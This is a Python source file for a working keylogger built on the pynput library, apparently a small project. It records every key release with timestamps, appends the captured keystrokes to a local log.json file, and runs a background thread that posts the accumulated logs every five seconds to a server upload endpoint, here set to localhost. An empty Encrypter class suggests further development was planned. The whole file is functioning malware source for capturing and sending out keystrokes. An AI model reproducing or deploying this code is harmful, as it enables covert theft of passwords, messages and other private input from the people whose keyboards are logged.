import time
import requests
import threading
import json
from pynput import keyboard
from pynput.keyboard import Key

class KeyLoggerService:
    def __init__(self):
        self.key_log_dict = {}
        self.all_logs = []

    def add_key(self, key):
        now_time = time.strftime("%d/%m/%y %H:%M", time.localtime())
        if now_time in self.key_log_dict:
            self.key_log_dict[now_time].append(str(key))
        else:
            self.key_log_dict[now_time] = [str(key)]

    def save_and_clear(self):
        if self.key_log_dict:
            self.all_logs.append(self.key_log_dict)
            self.key_log_dict = {}
        return self.all_logs

    def get_logs(self):
        return self.all_logs

class FileWriter:
    @staticmethod
    def write_to_file(key_data):
        with open("log.json", 'a') as log_file:
            json.dump(key_data, log_file, indent=2, ensure_ascii=False)
            log_file.write("\n")

class ServerSender:
    def __init__(self, server_url, service):
        self.server_url = server_url
        self.service = service
        threading.Thread(target=self.send_to_server, daemon=True).start()

    def send_to_server(self):
        while True:
            logs = self.service.get_logs()
            if logs:
                response = requests.post(self.server_url, json=logs)
                print(f"Data sent to server. Response: {response.text}")
            time.sleep(5)

class KeyLoggerManager:
    def __init__(self):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.server_sender = ServerSender("http://127.0.0.1:5000/api/upload", self.service)
        self.listener = None

    def handle_key_press(self, key):
        self.service.add_key(key)
        if key == Key.space:
            logs = self.service.save_and_clear()
            self.file_writer.write_to_file(logs)
        elif key == Key.esc:
            logs = self.service.save_and_clear()
            self.file_writer.write_to_file(logs)
            return False

    def start(self):
        with keyboard.Listener(on_release=self.handle_key_press) as listener:
            self.listener = listener
            listener.join()

class Encrypter:
    pass

if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.start()
